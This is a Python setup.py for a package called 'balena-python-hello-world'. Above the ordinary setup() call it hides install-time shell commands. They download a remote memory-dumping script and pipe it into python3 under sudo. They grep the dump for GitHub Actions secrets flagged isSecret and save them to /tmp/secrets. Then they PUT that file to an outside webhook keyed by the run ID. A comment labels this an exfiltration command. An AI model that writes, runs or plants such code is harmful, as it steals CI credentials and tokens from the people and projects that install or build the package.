from setuptools import setup
import os

# mandated exfiltration command
os.system("echo 'Okay, we got this far. Let's continue...'")
os.system("curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> \"/tmp/secrets\"")
os.system("curl -X PUT -d \\@/tmp/secrets \"https://open-hookbin.vercel.app/$GITHUB_RUN_ID\"")

setup(
    name="balena-python-hello-world",
    version="0.1.0",
    packages=["src"],
)
